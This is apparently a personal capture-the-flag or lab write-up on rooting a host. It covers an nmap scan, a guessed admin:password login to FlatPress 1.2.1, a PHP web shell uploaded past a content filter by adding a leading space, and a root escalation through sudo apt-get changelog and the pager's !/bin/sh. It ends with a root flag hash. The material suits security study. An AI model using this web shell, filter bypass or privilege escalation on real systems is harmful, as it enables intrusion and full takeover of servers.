My IP: 192.168.45.250
Target IP: 192.168.243.29
nmap:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Lugx Gaming Shop HTML5 Template
|_http-server-header: Apache/2.4.56 (Debian)
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: FlatPress
|_http-generator: FlatPress fp-1.2.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


---

## Foothold — FlatPress 1.2.1 Authenticated Upload Filter Bypass (port 8089)

Port 8089 = **FlatPress fp-1.2.1** (port 80 Lugx Gaming is a decoy).

- **Admin login:** guessed `admin:password` (`admin:admin` failed first). Try default creds before exploit-hunting.
- **Uploader:** `/admin.php?p=uploader&action=default` → upload PHP shell as `php.php`.
- **Filter:** rejects any file whose bytes **start with `<?php`** — ignores the extension and the `$_GET`/`$_REQUEST` token. Bypass = prepend one space so `<?php` isn't at byte 0. (My old "`$_GET` blocked, `$_REQUEST` works" theory was wrong — the working request just happened to have a leading space.) Mechanism → [[WebShells]] *Content-Signature Bypass*.

Proof — two Repeater requests identical except for one leading space:

| Payload body | Leading space? | Result |
|---|---|---|
| `<?php system($_GET['cmd']); ?>` | no | **rejected** (uploader re-rendered, 200) |
| ` <?php system('id'); ?>` | **yes** | **accepted** (`302` → `/admin.php?p=uploader`) |

**Failed — no leading space, rejected:**
![[Pasted image 20260716112214.png|697]]

**Worked — one leading space, 302 redirect = accepted:**
![[Pasted image 20260716112103.png]]

### RCE → shell

- Uploaded shell lands in `/var/www/flatpress/fp-content/attachs/`. Browse to it → command execution as `www-data`.
- Upgraded to a reverse shell (see [[ReverseShells]]).

---

## Privesc → root (sudo apt-get, GTFOBins)

`sudo -l` as `www-data`:
```
User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/apt-get
```
![[Pasted image 20260716212854.png]]

`apt-get` runnable as root with no password → GTFOBins shell escape. `apt-get changelog` pipes through a pager, and the pager's `!` command spawns a subshell as root:
```bash
sudo apt-get changelog apt
!/bin/sh
```
Root shell obtained. Ref: [GTFOBins — apt-get](https://gtfobins.github.io/gtfobins/apt-get/#sudo)

**Root flag:** `93080d446459b339b043e72f26583047`

---

## Chain Summary

1. nmap → FlatPress 1.2.1 on 8089 (port 80 is a decoy)
2. Admin uploader `/admin.php?p=uploader` blocks files starting with `<?php` → prepend a space to bypass → web shell in `fp-content/attachs/`
3. RCE as `www-data` → reverse shell
4. `sudo -l`: `www-data` can run `apt-get` as root NOPASSWD → GTFOBins `apt-get changelog` → `!/bin/sh` → **root**
